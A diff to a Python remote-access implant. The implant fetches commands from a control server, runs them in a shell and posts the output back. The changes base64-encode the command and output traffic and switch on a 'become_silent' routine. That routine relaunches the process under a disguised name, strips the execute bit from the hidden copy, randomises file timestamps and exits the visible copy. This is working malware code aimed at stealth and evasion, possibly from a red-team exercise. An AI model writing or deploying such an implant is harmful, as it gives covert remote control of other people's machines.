@@ -11,6 +11,7 @@ import shlex
 import time
 import random
 import pathlib
+import base64
 
 #TODO signed packets, not passwords
 password = "password"
@@ -33,6 +34,8 @@ def handle(data):
             stdout = run_builtin(parameters)
         else:
             stdout = run_command(command, parameters)
+    else:
+        print(f"Invalid command: {data}")
     
     output = f"Command: {command} {parameters}\n{stdout}"
     send_data(output)
@@ -45,7 +48,9 @@ def request_commands():
         array: list of commands
     """
     r = requests.get(f"http://0.0.0.0:{PORT}/commands")
-    return r.text.split()
+
+    data = base64.urlsafe_b64decode(bytes(r.text.encode('utf-8'))).decode('utf-8')
+    return data.split()
 
 def check_active():
     """Check if agent should be active or passive
@@ -59,6 +64,7 @@ def check_active():
     return False
 
 def send_data(data):
+    data = base64.urlsafe_b64encode(bytes(data.encode('utf-8')))
     r = requests.post(f"http://0.0.0.0:{PORT}/data", data = data)
     return r.status_code
 
@@ -160,7 +166,10 @@ def become_silent():
         cmd = subprocess.run(shlex.split(f"bash -c \"exec -a {bandit} {p.exe()} {hidden} &\""))
         cmd = subprocess.run(["/bin/chmod", "-x",  f"{hidden}"])
         randomize_timestamp(hidden)
+        print("Killing overt agent...")
         exit(0)
+    if cmdline == hidden:
+        pass
     else:
         leave_mark()
         # Should die if already on system
@@ -208,7 +217,7 @@ if __name__ == "__main__":
         except FileNotFoundError:
             pass
     upgrade_shell()
-    # become_silent()
+    become_silent()
 
     last_commands = ""
 
